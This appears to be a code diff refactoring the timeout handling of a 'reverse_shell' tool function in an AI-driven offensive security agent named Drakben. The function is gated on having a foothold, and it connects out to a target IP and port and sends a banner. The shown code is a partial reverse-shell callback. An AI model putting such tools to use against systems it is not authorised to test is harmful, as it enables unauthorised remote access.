@@ -67,8 +67,7 @@ def check_payload_preconditions(state: "AgentState") -> Tuple[bool, str]:
 async def reverse_shell(
     state: "AgentState", 
     target_ip: str = "127.0.0.1", 
-    target_port: int = 4444,
-    timeout: int = 30
+    target_port: int = 4444
 ) -> Dict[str, Any]:
     """
     STATE-AWARE Reverse shell - FOOTHOLD REQUIRED.
@@ -77,7 +76,6 @@ async def reverse_shell(
         state: AgentState instance
         target_ip: Target IP to connect to
         target_port: Target port
-        timeout: Connection timeout in seconds
         
     Returns:
         Dict with connection results
@@ -111,12 +109,11 @@ async def reverse_shell(
             "critical_violation": "Attempted payload without foothold",
         }
 
+    timeout_seconds = 30  # Fixed timeout value
     try:
         logger.debug(f"Attempting connection to {target_ip}:{target_port}")
-        _, writer = await asyncio.wait_for(
-            asyncio.open_connection(target_ip, target_port),
-            timeout=timeout
-        )
+        async with asyncio.timeout(timeout_seconds):
+            _, writer = await asyncio.open_connection(target_ip, target_port)
         
         writer.write(b"Drakben reverse shell connection established.\n")
         await writer.drain()
@@ -141,12 +138,12 @@ async def reverse_shell(
             "ip": target_ip,
             "port": target_port,
         }
-    except asyncio.TimeoutError:
+    except TimeoutError:
         logger.error(f"Reverse shell connection timeout to {target_ip}:{target_port}")
         return {
             "type": "ReverseShell", 
             "success": False, 
-            "error": f"Connection timeout after {timeout}s",
+            "error": f"Connection timeout after {timeout_seconds}s",
             "timeout": True
         }
     except ConnectionRefusedError:
